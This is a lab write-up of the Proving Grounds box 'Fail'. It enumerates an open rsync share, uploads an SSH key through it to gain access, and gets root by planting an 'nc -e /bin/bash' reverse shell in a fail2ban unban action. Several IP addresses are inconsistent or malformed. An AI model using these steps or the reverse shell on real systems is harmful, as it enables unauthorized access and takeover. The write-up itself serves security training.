# Fail Overview

Machine Details:

|IP|Hostname|Operating System|
|---|---|---|
|192.168.61.126|Fail|Linux|

## Path to Exploitation
Fail is a relatively simple box provided on Proving Grounds that requires us to identify the rsync share and leverage it to gain access to the machine. From there take advantage of a script file that allows us to run commands at the root user. 

# Fail Enumeration

## Full Port Scan

```bash
nmap -p- -Pn -oA nmap/full-port --open 192.168.61.126
```

Results:

|Port|Service|
|--|--|
|22|ssh|
|873|rsync|

## Service Scan

|Port|Service|Version|
|--|--|--|
|22|ssh|OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)|
|873|rsync|(protocol version 31)|

## rsync Scans

```bash
nmap -sV --script rsync-list-modules -oA nmap/rsync-scan 192.168.61.126 873
```

Results:

We find a share

![RSync Share](/assets/ProvingGrounds/Fail/rsync-share.png)

# RSync
We can enumerate the share with the following command:

```bash
$ rsync -av --list-only rsync://192.168.61.126/fox
```

![Share Contents](/assets/ProvingGrounds/Fail/share-content.png)

We can also download the files with the following command:

```bash
$ rsync -av rsync://192.168.156.126/fox ./rsyn_shared
```

Testing file upload

```bash
$ touch test
$ rsync test 192.168.x.126::fox
$ rsync -av --list-only rsync://192.168.61.126/fox
```

![File Upload](/assets/ProvingGrounds/Fail/file-upload.png)

We have file upload capabilities to the share.

# Shell on Fail
We can create an SSH key pair and upload our public key to the host

![Keygen](/assets/ProvingGrounds/Fail/key-gen.png)

Create the authorized_keys file and upload it to the .ssh directory

SSH into the host as the fox user

# Privilege Escalation
Modify the file to contain the following command on the actionunban command line:

```bash
nc -e /bin/bash 192.168.168.49.177 443
```

![Modify Command](/assets/ProvingGrounds/Fail/privesc-exploit.png)

Setup the nc listener and attempt several incorrect SSH attempts to trigger the command

![Execute the Exploit](/assets/ProvingGrounds/Fail/privesc-execute.png)

Now wait for the service to restart and execute the unban command. We will see that we caught a reverse shell running as root.
